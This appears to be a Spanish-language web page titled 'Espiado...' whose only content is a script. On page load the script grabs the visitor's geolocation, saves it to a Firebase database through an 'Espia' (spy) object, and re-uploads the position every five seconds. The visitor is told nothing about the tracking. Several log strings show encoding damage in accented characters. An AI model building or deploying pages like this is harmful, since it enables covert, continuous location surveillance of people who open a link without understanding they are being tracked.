<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Espiado...</title>

    <script src="https://www.gstatic.com/firebasejs/7.9.3/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/7.9.3/firebase-firestore.js"></script>
    <script src="https://www.gstatic.com/firebasejs/7.9.3/firebase-analytics.js"></script>
    <link
      rel="stylesheet"
      href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
      integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh"
      crossorigin="anonymous"
    />
  </head>
  <body onload="getLocation()">

    <script src="js/database.js"></script>
    <script src="js/crud spy.js"></script>
    <script src="js/guardadoSpy.js"></script>
    <script src="js/snapshot spy.js"></script>

    <script>
      var lat;
      var lng;
      var id;
      var flag = 0;
      var intervalo = 0;

      console.log("Iniciando script");

      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition);
        } else {
          console.log("Geolocation is not supported by this browser.");
        }
      }

      function showPosition(position) {
        lat = position.coords.latitude;
        lng = position.coords.longitude;

        console.log(lat + "----" + lng);

        saveLocation();
      }

      function saveLocation() {
        if (flag == 0) {
          var registro = new Espia(null, lat, lng);
          console.log(
            "Se cre칩 el registro, los datos son: \nid:" +
              registro.id +
              "\nlat: " +
              registro.lat +
              "\nlng: " +
              registro.lng
          );
        } else {
          console.log("Reciclando registro: " + flag);
          var registro = new Espia(id, lat, lng);
        }

        console.log(
          "El flag actualmente es (antes de entrar a condicion if): " + flag
        );
        if (flag == 0) {
          registro.agregar();
          console.log("Se insert칩 registro en BD con el id: " + id);
          flag = id;
          getLocation();
        } else {
          console.log(
            "Se actualizar치 la ubicaci칩n\n" + "id de firebase: " + id
          );

          setInterval(() => {
            console.log(intervalo);
            intervalo++;

            
            moverPosicion(registro);
            registro.actualizar();
          }, 5000);
        }
      }

      function moverPosicion(reg) {
        navigator.geolocation.getCurrentPosition(posicion => {
          reg.lat = posicion.coords.latitude;
          reg.lng = posicion.coords.longitude;
        });
      }
    </script>
    <script
      src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
      integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
      integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
      integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
